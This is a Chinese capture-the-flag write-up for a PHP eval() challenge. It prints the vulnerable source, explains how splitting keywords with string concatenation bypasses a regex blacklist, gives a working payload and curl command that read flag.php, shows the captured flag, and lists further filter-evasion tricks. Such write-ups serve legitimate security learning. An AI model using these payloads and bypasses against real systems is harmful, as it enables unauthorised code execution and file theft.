# WP · qsnctf 40661 — eval 双过滤 + 关键字拼接绕过

> 类型：PHP 代码执行（eval）/ 黑名单关键字绕过
> 技术栈：nginx/1.22.1 + PHP/7.4.33
> 难度：入门（开卷源码）

## 一、题目信息
- 地址：`http://challenge.qsnctf.com:40661/`
- 入口：`?cmd=` 参数，值会被 `eval()` 执行。

## 二、信息收集（开卷源码）
页面直接把源码打印出来（`highlight_file(__FILE__)`）。核心逻辑：

```php
include("flag.php");                       // flag 在 flag.php 里被包含进来
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // 第一关：cmd 不能出现下面这些词（不区分大小写）
    if (!preg_match("/system|exec|highlight|show_source|include|passthru|flag|php|cat|head|tail|more|less/i", $cmd)) {
        // 第二关：cmd 里必须包含 "base" 子串
        if (preg_match("/base/i", $cmd)) {
            eval($cmd);                    // 两关都过 → 执行我们输入的代码
        } else { die("HACK!"); }
    } else { die("HACK!!!"); }
}
```

## 三、漏洞分析
1. **入口即代码执行点**：`cmd` 被 `eval` 执行，能跑任意 PHP。
2. **两道闸门**：
   - 黑名单：`cmd` 不能含 `system`/`exec`/`flag`/`php`/`cat`/`head`/`tail`/`more`/`less`/`include`/`passthru`/`highlight`/`show_source`（大小写不敏感）。
   - 放行条件：必须含 `base` 子串，否则直接 `die("HACK!")`。
3. **目标**：把 `flag.php` 里的 flag 拿出来。它被 `include`，内容形如 `<?php $flag="flag{...}"; ?>`。

## 四、绕过思路
- 黑名单查的是 **"字符串字面量"**。我们不在 `cmd` 里直接写 `flag` / `php`，而是用 PHP 字符串拼接把它们拼出来：
  - `'fl'.'ag'` 运行结果是 `flag`，但源码里没有连续的 `flag` 字样；
  - `'p'.'hp'` 同理躲过 `php` 关键字。
- 用 `file_get_contents` 读文件（它**不在**黑名单里），拼出文件名即可拿到 `flag.php` 源码。
- 末尾加 `//base` 注释，满足"必须含 base"的放行条件。

> 反套路提示：出题人强制要求 `base`，其实是想引导你用 `base64_decode(...)` 之类的函数去执行代码；但用字符串拼接读文件更直接省事。

## 五、利用 payload
```
?cmd=echo file_get_contents('fl'.'ag'.'.'.'p'.'hp');//base
```

curl 自动 URL 编码发送：
```bash
curl -s -G \
  --data-urlencode "cmd=echo file_get_contents('fl'.'ag'.'.'.'p'.'hp');//base" \
  "http://challenge.qsnctf.com:40661/"
```

返回（即 flag.php 源码）：
```php
<?php
$flag="flag{d607e5968bd04134b5039a1957f9538f}";
?>
```

## 六、拿到 flag
```
flag{d607e5968bd04134b5039a1957f9538f}
```

## 七、复盘 & 套路沉淀
- **核心心法**：WAF 拦"字符串"，PHP 认"语义"。把被拦的字符串拆开拼接，语义不变就能过。
- **同类手法家族**：
  - 空格 → `${IFS}` / `<` / `%09` / `{cat,f}`
  - 分隔符 → `%0a` 换行 / 双重编码 `%250a`
  - 命令 → `c""at` / `c''at` / `ca$@t`
  - 关键字 → `'fl'.'ag'` 拼接 / 可变变量 `$$x`
- **变种**：若想直接输出变量 `$flag`，可用可变变量 `$x='fl'.'ag';echo $$x;`（同样避开字面 flag）。但**读文件更稳**，因为不依赖 flag.php 是否把值赋给某个变量。
- **踩坑提醒**：直接写 `flag`、`php`、`system` 等任意被拦词 → 立刻 `HACK!!!`；别忘了 `base` 是放行门槛，少它就 `HACK!`。
